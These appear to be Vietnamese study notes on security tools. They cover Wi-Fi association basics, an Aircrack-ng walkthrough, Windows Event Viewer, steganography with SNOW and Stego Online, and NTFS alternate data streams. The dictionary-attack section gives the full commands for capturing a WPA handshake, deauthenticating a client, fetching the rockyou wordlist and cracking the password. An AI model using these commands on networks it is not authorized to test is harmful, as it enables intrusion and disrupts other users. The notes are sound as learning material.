# Hash function
# Aircrack-ng tools
## Actual activities in a wireless network

Thông thường khi kết nối tới 1 wireless, mik sẽ dùng OSA (Open System Authentication), có những bước sau đây: <br>

1. Gửi đến wireless (AP) 1 yêu cầu cho authentication
2. Nếu thành công AP sẽ accept authentication
3. Gửi đến AP 1 yêu cầu associated
4. Nếu thành công AP sẽ accept associated

--> Đây là trường hợp cơ bản nhất. Ngoài ra
1. WPA/WPA2 được sử dụng, mik pải có EAPOL (1 network protocol) authentication nếu ko thì fail ở step 2.
2. Ngoài ra có 1 MAC filtering
3. AP sử dụng Shared Key Authentication (Pải dùng đúng WEP key mới có thể connect)

> WPA/WPA2 là gì

Giao thức được sử dụng trong wireless connection để tăng security. WPA2 sử dụng AES encryption method

> AP là gì???

Nó như 1 cầu nối giữa thiết bị và mạng. Nó sẽ gửi những packets bao gồm những in4 sau:
1. Name của network (ESSID)
2. Encryption của nó
3. Mbit rate
4. Những channel trong network nào đang hoạt động

> WPA/WPA2 4ways-handshake

Có 2 thứ diễn ra trong quá trình này:
1. Client và AP sẽ trao đổi in4 thông qua 1 kết nối an toàn
2. Quá trình handshake này cần dữ liệu được mã hóa để verified PSK (Pre-Shared key)

Qúa trình này cần thiết trong dictionary attack = cách bắt nó reconnect, ta sẽ có được 4ways-handshake <br>
chưa nhiều thông tin của connection

## Discovering network

Turn on monitor mode của wifi apdapter

```
sudo airmon-ng wlan0 start
```

Nhưng trước khi bật monitor mode, mik cần phải bật airmon-check <br>
để xem cần kill những process nào

```
sudo airmon-ng check
```

```
sudo airmon-ng check kill
```

Sau đó thực hiện bắt tất cả các AP (Access Pointer)

```
sudo airodump-ng <interface>
```
#### Elements ở trong bảng recon network
![image](https://github.com/user-attachments/assets/7b841beb-9466-49ea-ade4-4b148cdae93b)

ý nghĩa của từng elements:

![image](https://github.com/user-attachments/assets/995af50a-18ce-4dc5-ac19-400f22179ee4)

***Nhiều BSSID có cùng ESSI là do chúng share cùng 1 cục ra nhiều địa điểm khác nhau <br>
để mở rộng bandwidth***

## Dictionary Attack

***Tấn công = thử tất cả các password của 1 lists***

1. Bật monitor mode của wifi adapter

  
  
2. Mik sẽ cần bắt những packets đến AP
  ```
  sudo airodump-ng --bssid <BSSID> --channel <CH> --write <output_file> wlan0mon
  ```
   
3. Deauthicate bắt AP thực hiện 4hand-shake
  ```
  sudo aireplay-ng --deauth <# packets> -a <BSSID> -c <CLIENT-MAC> wlan0mon
  ```
4. Tải rock_you.txt

  ```
  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
  ```
  
5. Attack Command
  ```
  sudo aircrack-ng -w <dictionary_file> -b <BSSID> <capture_file>.cap
  ```

# Event Viewer
![image](https://github.com/user-attachments/assets/193d98d7-89db-4e70-b341-788858c64224)

Lists log trong windows với các Level lỗi từ thấp tới cao như (Information, Warning, Error, Critical)

![image](https://github.com/user-attachments/assets/e1d3f61c-ae5f-414d-8891-28098fea85ca)

Hiển thị các loại lỗi mà mình muốn xem

![image](https://github.com/user-attachments/assets/dc802fc3-7073-4fa3-9c08-117675a07dd7)

Có thể filter các loại log trong đề mục

![image](https://github.com/user-attachments/assets/245f64c7-625a-4f67-8c69-4fe1b5868296)

Các option mik có thể làm với mỗi event

***Windows ko hỗ trợ xóa 1 log cụ thể, chỉ có thể xóa 1 loạt logs. Nếu có pải dùng 1 3-party***

# Stego Online

*Image Original*

![Screenshot 2024-10-26 062405](https://github.com/user-attachments/assets/f985511b-3308-4c51-b69c-72a1e0893aee)

*Image encrypted*

![encrypted](https://github.com/user-attachments/assets/a3d7663c-27f3-4d2e-807e-406d5f9cb849)

Sử dụng Stego Online

![image](https://github.com/user-attachments/assets/89e6b3ac-9f05-4086-a43d-13d0958c49c4)

# SNOW steg tool
![image](https://github.com/user-attachments/assets/503c231c-d92e-4c81-a024-e20941ebac09)

*Tạo 1 message hiện thị trong file input. Với option -p "password" sẽ dùng cho decrypt output, -m "text" sẽ là text ẩn <br>
mình sẽ giấu trong output file*

![image](https://github.com/user-attachments/assets/209f5e59-c8b9-4572-b8c5-ddd8c4477560)

Để decrypt với cú pháp khá đơn giản

*Cái SNOW này sử dụng phương pháp whitespace steganography. Đầu tiên convert chữ cái ra binary theo ASCII. Với bit 1 tương ứng với <br>
tab còn bit 0 tương ứng với space*

![image](https://github.com/user-attachments/assets/ad27670d-fe9e-4980-9550-4b64a018e7dd)

*Đây là lý do tại sao mình sẽ nhìn thấy 1 loạt tab và space (trống 2 dòng dưới cùng). Nó là 2 dòng đại diện cho cái hidden text*

# NTFS / FAT32

> Một chút về 2 cái này

NTFS và FAT32 là 2 file systems để quản lý toàn bộ file trên máy tính. NTFS được sử dụng bởi Windows còn FAT32 thì méo rõ <br>
vì ko thấy trên Win còn Linux thì dùng ext.

Tác dụng của cái này là để quản lý file, chuyển dữ liệu, đọc, viết, xem file ... Ncl tất cả những gì mình có thể làm trên file <br>
đều do thằng này quản lý. Ví dụ muốn đọc file của Windows trên HĐH Linux thì bắt buộc phải sdung phần mềm thứ 3 để đọc vì (NTFS và ext) <br>
là 2 cái hoàn toàn khác nhau.

> ADS (Alternative Data Stream)

Là 1 cái feature của NTFS có thể hidden 1 file trong 1 file mà ko tác động đến file đó (ko thay đổi size của file, ...)

> Practical

![image](https://github.com/user-attachments/assets/4aa8d2aa-9723-4032-914f-1efd156aebf7)

Tạo 1 file 21 bytes

![image](https://github.com/user-attachments/assets/e78d222e-285f-4ead-a709-a3457d000dfd)

Thực hiện ADS 1 hidden message vào file được chọn, vẫn thấy size của file không thay đổi

![image](https://github.com/user-attachments/assets/cc1e745c-1161-4051-83cd-4bcfd24f586f)

Đọc hidden message có trong file









